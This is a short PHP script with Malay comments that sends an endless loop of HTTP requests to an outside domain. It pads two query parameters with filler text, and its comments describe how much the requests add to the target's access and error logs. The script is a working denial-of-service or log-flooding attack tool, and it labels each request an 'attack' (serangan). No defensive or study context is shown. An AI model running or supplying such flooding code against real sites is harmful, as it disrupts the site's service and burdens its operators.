<?php
//Nilainnya dibesarkan kerana parameternya hanya dua
$packet = 	"1234567890abcdefghijklmnopzrstuvwxyz" . 
			"1234567890abcdefghijklmnopzrstuvwxyz" .
			"1234567890abcdefghijklmnopzrstuvwxyz" .
			"1234567890abcdefghijklmnopzrstuvwxyz" .
			"1234567890abcdefghijklmnopzrstuvwxyz";

//Jumlah lebih kurang 500-600 byte dalam access logs
//Jumlah lebih kurang 150 byte dalam error logs
$url = "http://w.batterypropel.cyou/f6a0ZFJBA3dVckIBQmsEXkBxU1ZAWFARDWQGWX0IGV0IDTpDV0l-BxUgMVw8BEkgOkwbF24tSAEpYgNkIA&p=$packet&_wi=$packet";

$n = 1;
while(true){
	$res = file_get_contents($url);
	
	if(!$res){
		echo "Terputus pada: " . $n . " serangan";
	}
}